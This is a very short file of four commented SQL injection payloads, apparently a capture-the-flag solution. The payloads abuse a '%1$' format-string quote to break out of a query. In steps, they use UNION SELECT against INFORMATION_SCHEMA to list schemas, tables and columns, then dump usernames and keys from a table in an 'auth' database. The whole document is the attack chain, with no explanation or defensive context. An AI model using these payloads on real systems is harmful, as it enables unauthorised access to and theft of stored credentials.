// 1- %1$') or 1=1 union select schema_name,null,null from INFORMATION_SCHEMA.SCHEMATA;--
// 2- %1$') or 1=1 union select table_name,null,null from INFORMATION_SCHEMA.TABLES where table_schema=%1$'auth%1$';--
// 3- %1$') or 1=1 union select column_name,null,null from INFORMATION_SCHEMA.COLUMNS where table_name=%1$'users_erRP9T6C%1$';--
// 4- %1$') or 1=1 union select username,`key`,null from auth.users_erRP9T6C;--
